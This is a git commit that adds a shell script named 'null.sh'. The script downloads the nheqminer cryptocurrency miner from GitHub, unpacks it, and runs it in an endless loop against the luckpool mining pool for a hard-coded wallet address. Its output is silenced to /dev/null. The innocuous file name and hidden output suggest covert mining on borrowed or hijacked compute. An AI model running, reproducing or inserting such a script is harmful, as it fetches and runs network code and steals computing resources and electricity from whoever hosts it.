8b171ccb50d88043e76e4051d309863f02a9b6c3
smaxvbvb <93235050+smaxvbvb@users.noreply.github.com>
2021-10-27 09:00:55 +0700

    Create null.sh

---
+++ null.sh
@@ -0,0 +1,10 @@
+!#/bin/sh
+
+#start
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+tar -xvf nheqminer-Linux-v0.8.2.tgz 
+tar -xvf nheqminer-Linux-v0.8.2.tar.gz
+while [ 1 ]; do
+nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.rucika -p x -t 2 >/dev/null
+sleep 2
+done
